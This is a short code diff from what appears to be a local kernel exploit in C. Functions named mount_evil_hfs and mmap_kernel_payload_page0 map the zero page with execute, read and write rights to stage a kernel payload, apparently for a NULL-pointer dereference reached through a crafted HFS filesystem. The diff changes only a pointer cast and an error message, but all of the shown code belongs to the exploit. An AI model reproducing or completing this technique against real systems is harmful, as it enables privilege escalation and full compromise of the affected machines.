@@ -84,14 +84,14 @@ void mount_evil_hfs() {
 
 void mmap_kernel_payload_page0() {
 	unsigned int *mmap_addr;
-	void* addr = 0x0;
+	void* addr = (void *) 0x0;
 	size_t length = 0x1000;
 
 	mmap_addr = mmap(addr, length, PROT_EXEC|PROT_READ|PROT_WRITE, MAP_FIXED|MAP_PRIVATE|MAP_ANON, -1, 0);	
 	printf("mmap ret addr : 0x%X\n", (unsigned int) mmap_addr);
 
-	if (mmap_addr != (unsigned int*) (0x0)) {
-		printf("Can't mmap 0x0 page.\n");
+	if (mmap_addr != (unsigned int*) addr) {
+		printf("Can't mmap 0x%X page.\n", (unsigned int) addr);
 		exit(1);
 	}
 
